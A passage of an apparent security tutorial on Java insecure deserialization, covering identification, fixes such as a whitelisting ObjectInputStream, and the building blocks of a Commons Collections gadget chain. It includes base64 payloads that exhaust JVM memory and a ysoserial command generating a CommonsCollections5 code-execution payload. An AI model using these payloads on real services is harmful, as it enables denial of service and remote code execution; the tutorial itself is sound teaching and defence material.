+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;here&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">User</span> <span class="n">asinha</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oIn</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>  <span class="c1">// actual deserialization</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">oIn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">bIn</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">asinha</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nCaught an exception... Invalid object?\n&quot;</span><span class="o">);</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Result:</p>
+
+<p>If we supply that <code>base64</code> encoded evil object through command_line argument, then during the Deserialization process, it consumes <code>100%</code> CPU cycle.</p>
+
+<p>Following interesting payloads will directly <code>kill</code> the process.</p>
+
+<pre><code>[+] payload 1:
+cat ../../../../../../web-attacks/insecure_deserialization/java_dos/topolik/8gb-nested-hashmap
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABBAAAAAc3EAfgAAP0AAAAAAAAx3CAAAABBAAAAAcHB4cHg=
+
+[*] result:
+Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
+
+[+] payload 2:
+cat ../../../../../../web-attacks/insecure_deserialization/java_dos/topolik/8gb-generic
+rO0ABX1////3
+
+[*] result:
+java.io.InvalidObjectException: interface limit exceeded: 2147483639
+</code></pre>
+
+<h2>How to Identify</h2>
+
+<ol>
+<li><p>From Blackbox perceptive:</p>
+
+<ul>
+<li>Check for <code>AC ED 00 05</code> or <code>rO0A</code> (base64 encoded format) magic numbers in request / response, to know that the application deals with a <code>serialized</code> object.</li>
+</ul>
+</li>
+<li><p><code>Content-type</code> header of an HTTP response set to <code>application/x-java-serialized-object</code>.</p></li>
+<li><p>From Whitebox perceptive:</p>
+
+<ul>
+<li>Search for the Java Serialization APIs such as <code>ObjectInputStream</code> with <code>readObject</code> keywords through out the code base and check how the <code>ObjectInputStream</code> is used.</li>
+<li>Before the <code>readObject()</code> method call, does the code check for all expected classes from the <code>serialized</code> object through a <code>whitelist</code>.</li>
+</ul>
+</li>
+</ol>
+
+
+<h2>How to Exploit</h2>
+
+<p>The black box angle uses <code>ysoserial.jar</code> and iterates different payloads to generate the serialized object.</p>
+
+<pre><code class="bash">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 gnome-calculator &gt; /root/code-dev/java/demo_insecure_deserialization/Serialization/bad_serialized_object_ysoserial.ser
+</code></pre>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/ysoserial_cal.png" alt="ysoserial" /></p>
+
+<p>Alternate:</p>
+
+<ul>
+<li>Burp Suite Plug-in: <a href="https://blog.netspi.com/java-deserialization-attacks-burp/">Java Serial Killer</a></li>
+</ul>
+
+
+<h2>How to Fix</h2>
+
+<ol>
+<li>Don&rsquo;t blindly accept serialized objects from <code>untrusted</code> sources. Implement integrity check / sign the serialized object to prevent hostile object creation/tampering.</li>
+<li>Whitelist based approach to harden own <code>java.io.ObjectInputStream</code>:
+
+<ol>
+<li>Create a <code>HashSet</code> using all <code>excepted</code> classes wrapped in the Object.</li>
+<li>Create a <code>SafeObjectInputStream</code> class by <code>extending</code> the <code>ObjectInputStream</code> class.</li>
+<li>Overwrite the <code>resolveClass()</code> method and check if the <code>cls.getName()</code> exists within the <code>HashSet</code> else throw <code>InvalidClassException</code> exception.</li>
+</ol>
+</li>
+</ol>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.Set</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SafeDeserialize</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// fix 1: a blacklist based approach where the InvokerTransformer is blocked</span>
+</span><span class='line'>            <span class="c1">// however this can be bypassed by discovering a new gadget chains</span>
+</span><span class='line'>            <span class="c1">// in current Java, by default enableUnsafeSerialization is set to &#39;false&#39;</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span>
+</span><span class='line'>                    <span class="s">&quot;org.apache.commons.collections.enableUnsafeSerialization&quot;</span><span class="o">,</span>
+</span><span class='line'>                    <span class="s">&quot;true&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="c1">// file name of the deserialized object</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">fname</span> <span class="o">=</span> <span class="s">&quot;../Serialization/bad_serialized_object.ser&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">FileInputStream</span> <span class="n">fin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">FileInputStream</span><span class="o">(</span><span class="n">fname</span><span class="o">);</span>
+</span><span class='line'>            <span class="c1">// fix 2: whitelist based approach, resolve the class from the serialized object and</span>
+</span><span class='line'>            <span class="n">Set</span> <span class="n">whitelist</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;(</span><span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="s">&quot;User&quot;</span><span class="o">));</span>
+</span><span class='line'>            <span class="n">ObjectInputStream</span> <span class="n">oin</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">SafeObjectInputStream</span><span class="o">(</span><span class="n">fin</span><span class="o">,</span> <span class="n">whitelist</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// expecting a User type obj, actual deserialization happens here</span>
+</span><span class='line'>            <span class="n">User</span> <span class="n">a</span> <span class="o">=</span> <span class="o">(</span><span class="n">User</span><span class="o">)</span> <span class="n">oin</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">oin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">fin</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;\nThe object was read from &quot;</span> <span class="o">+</span> <span class="n">fname</span> <span class="o">+</span> <span class="s">&quot;:&quot;</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">();</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">SafeObjectInputStream</span><span class="o">&lt;</span><span class="n">Public</span><span class="o">&gt;</span> <span class="kd">extends</span> <span class="n">ObjectInputStream</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="n">Set</span> <span class="n">whitelist</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="kd">public</span> <span class="nf">SafeObjectInputStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inputStream</span><span class="o">,</span> <span class="n">Set</span> <span class="n">whitelist</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+</span><span class='line'>        <span class="kd">super</span><span class="o">(</span><span class="n">inputStream</span><span class="o">);</span>
+</span><span class='line'>        <span class="k">this</span><span class="o">.</span><span class="na">whitelist</span> <span class="o">=</span> <span class="n">whitelist</span><span class="o">;</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="nd">@Override</span>
+</span><span class='line'>    <span class="kd">protected</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="n">ObjectStreamClass</span> <span class="n">cls</span><span class="o">)</span>
+</span><span class='line'>            <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span>
+</span><span class='line'>    <span class="o">{</span>
+</span><span class='line'>        <span class="c1">// check with expected whitelist classes</span>
+</span><span class='line'>        <span class="k">if</span> <span class="o">(!</span><span class="n">whitelist</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
+</span><span class='line'>            <span class="k">throw</span> <span class="k">new</span> <span class="nf">InvalidClassException</span><span class="o">(</span><span class="s">&quot;Unsupported class =&gt; &quot;</span><span class="o">,</span> <span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>        <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">cls</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/fix.png" alt="fix" /></p>
+
+<ol>
+<li>Virtual patching / JVM wide fix: Harden, all <code>java.io.ObjectInputStream</code> usage with an Agent through a blacklist. Example: <code>contrast-rO0</code>.</li>
+<li>The <code>readObject()</code> method should be inside the <code>try/catch</code> block because any mismatch occurs between the <code>serialized</code> object and <code>expected</code> object during type_check, then the <code>Exception</code> has to be handled properly.</li>
+<li><code>transient</code> keyword is used not to <code>serialize</code> a variable like the <code>password</code> field. When JVM comes across <code>transient</code> or <code>static</code> keyword, it ignores the original value of the variable and saves the <code>default</code> value of that variable data type.</li>
+<li>Some objects may be forced to implement <code>Serializable</code> due to their hierarchy. To guarantee that your application objects can&rsquo;t be deserialized, a <code>readObject()</code> method should be declared (with a <code>final</code> modifier) which always throws an exception:</li>
+</ol>
+
+
+<pre><code class="java">private final void readObject(ObjectInputStream in) throws java.io.IOException {
+   throw new java.io.IOException("Cannot be deserialized");
+}
+</code></pre>
+
+<ol>
+<li>In current Java, Java Security Manager does not allow blacklisted classes to be serialized, and the <code>enableUnsafeSerialization</code> is set to <code>FALSE.</code></li>
+<li>Detective control: <code>Log</code> the exceptions and failures that happen during deserialization.</li>
+</ol>
+
+
+<blockquote><p>DoS is unavoidable if the expected object type is HashSet / HashMap / ArrayList.</p></blockquote>
+
+<h2>How to inspect Java libraries and <code>classpaths</code> for Gadget Chains</h2>
+
+<p><strong>Automated approach</strong>: To find the existence of one / more gadget chains, run <code>Gadget Inspector</code> on all libraries (i.e. <code>commons-collections-3.2.2.jar</code>) present in the Java classpaths.</p>
+
+<pre><code>java -Xmx2G -jar build/libs/gadget-inspector-all.jar /root/code-dev/java/JavaExternalLibs/commons-collections-3.2.2.jar
+</code></pre>
+
+<p>The tool found 1 <code>gadget chains</code> and saved the result in <code>gadget-chains.txt.</code></p>
+
+<p><img src="/artifacts/insecure_deserialization_java.assets/gadget-inspector.png" alt="" /></p>
+
+<p><strong>Limitation of the tool</strong>:</p>
+
+<ul>
+<li>Not always an <code>exploit</code> can be built from the result.</li>
+<li>It can produce a <code>false negative</code> effect.</li>
+</ul>
+
+
+<h2>Demystifying a Known Gadget Chain</h2>
+
+<blockquote><ul>
+<li>Technique is called property oriented programming.</li>
+<li>JRE System Libraries (default, available in every Java program):
+
+<ul>
+<li>HashMap</li>
+</ul>
+</li>
+<li>commons-collections-3.2.2.jar:
+
+<ul>
+<li>Transformer, ConstantTransformer, InvokerTransformer, ChainedTransformer</li>
+<li>LazyMap, TiedMapEntry, HashBag</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+
+<h3>Command Execution using <code>Runtime</code></h3>
+
+<blockquote><p>First, let&rsquo;s understand how we can execute a command in Java.</p></blockquote>
+
+<ul>
+<li>We can use the <code>Runtime</code> Object in Java to execute system command (i.e., Running the gnome-calculator)</li>
+</ul>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept01</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// understand how to execute command in Java</span>
+</span><span class='line'>            <span class="c1">// exec() is not a static method so we can&#39;t call directly without creating an object</span>
+</span><span class='line'>            <span class="c1">// due to that Runtime.exec(&quot;/usr/bin/gnome-calculator&quot;); // =&gt; will not NOT work</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// Runtime.getRuntime().exec(&quot;/usr/bin/gnome-calculator&quot;); // compact form</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">();</span>  <span class="c1">// step 1: need to get the runtime object</span>
+</span><span class='line'>            <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">);</span>  <span class="c1">// step 2: call the exec() method with the runtime object</span>
+</span><span class='line'>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<h3>Reflection API</h3>
+
+<blockquote><p>What are the other ways we can execute a command in Java.</p></blockquote>
+
+<ul>
+<li><p>Reflection is an API that is used to <code>examine</code> or <code>modify</code> the behavior of methods, classes, interfaces at <code>runtime.</code></p></li>
+<li><p><strong>Key Point:</strong> Through reflection API, we can <code>invoke</code> <code>methods</code> at <code>runtime</code> irrespective of the access specifier used.</p></li>
+</ul>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.lang.Runtime</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept02</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// understanding the concept of Java reflection API</span>
+</span><span class='line'>            <span class="n">Class</span><span class="o">&lt;</span><span class="n">Runtime</span><span class="o">&gt;</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">Method</span> <span class="n">m</span> <span class="o">=</span> <span class="n">cls</span><span class="o">.</span><span class="na">getMethod</span><span class="o">(</span><span class="s">&quot;getRuntime&quot;</span><span class="o">);</span> <span class="c1">// examine a method of that Class dynamically</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// equivalent code: Runtime r = (Runtime) Runtime.getRuntime();</span>
+</span><span class='line'>            <span class="n">Runtime</span> <span class="n">r</span> <span class="o">=</span> <span class="o">(</span><span class="n">Runtime</span><span class="o">)</span> <span class="n">m</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>  <span class="c1">// executing the method to get a Runtime object</span>
+</span><span class='line'>            <span class="c1">// arg 1 =&gt; static class function -&gt; null is passed instead of object</span>
+</span><span class='line'>            <span class="c1">// arg 2 =&gt; null means no argument</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">r</span><span class="o">.</span><span class="na">exec</span><span class="o">(</span><span class="s">&quot;/usr/bin/gnome-calculator&quot;</span><span class="o">);</span>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Execute the gnome-calculator using Reflection API.</p>
+
+<h3>Transformer</h3>
+
+<ul>
+<li><strong>Key Point:</strong> A Transformer transforms an <code>input</code> object to an <code>output</code> object through <code>transform()</code> method.</li>
+<li>It doesn&rsquo;t change the input object.</li>
+<li>Mainly used for:
+
+<ol>
+<li>Type conversion</li>
+<li>Extracting parts of an object</li>
+</ol>
+</li>
+</ul>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.lang3.StringUtils</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyReverse</span> <span class="kd">implements</span> <span class="n">Transformer</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">transform</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="n">String</span> <span class="n">d</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">o</span><span class="o">;</span>
+</span><span class='line'>        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;executing transform method !!: &quot;</span> <span class="o">+</span> <span class="n">d</span><span class="o">);</span>
+</span><span class='line'>        <span class="k">new</span> <span class="nf">Exception</span><span class="o">().</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">StringUtils</span><span class="o">.</span><span class="na">reverse</span><span class="o">(</span><span class="n">d</span><span class="o">);</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept03</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// understanding the basic concept of transformer</span>
+</span><span class='line'>            <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="s">&quot;asinha&quot;</span><span class="o">;</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="c1">// objective is to reverse the string via transformer.transform() method</span>
+</span><span class='line'>            <span class="n">MyReverse</span> <span class="n">r_transformer</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">MyReverse</span><span class="o">();</span>  <span class="c1">// MyReverse cls implements transformer</span>
+</span><span class='line'>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">r_transformer</span><span class="o">.</span><span class="na">transform</span><span class="o">(</span><span class="n">s</span><span class="o">));</span>  <span class="c1">// calling the transform method</span>
+</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span><span class='line'>        <span class="o">}</span>
+</span><span class='line'>    <span class="o">}</span>
+</span><span class='line'><span class="o">}</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Passing a <code>String</code>object to a <code>Transformer</code> and <code>transform()</code> method reverses the input <code>String</code> and finally returns the <code>String</code> object.</p>
+
+<p>Different categories of <code>Transformers</code>:</p>
+
+<h3>ConstantTransformer</h3>
+
+<ul>
+<li><strong>Key Point:</strong> Always returns the <code>same</code> object <code>specified during initialization.</code></li>
+</ul>
+
+
+<p><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.Transformer</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Concept04</span> <span class="o">{</span>
+</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
+</span><span class='line'>            <span class="c1">// concept of ConstantTransformer</span>
+</span><span class='line'>            <span class="n">Transformer</span> <span class="n">t</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>  <span class="c1">// it&#39;s transform() method always returns a reflection of java.lang.Runtime class</span>
+</span><span class='line'>
+</span><span class='line'>            <span class="n">HashSet</span> <span class="n">h</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">HashSet</span><span class="o">();</span>
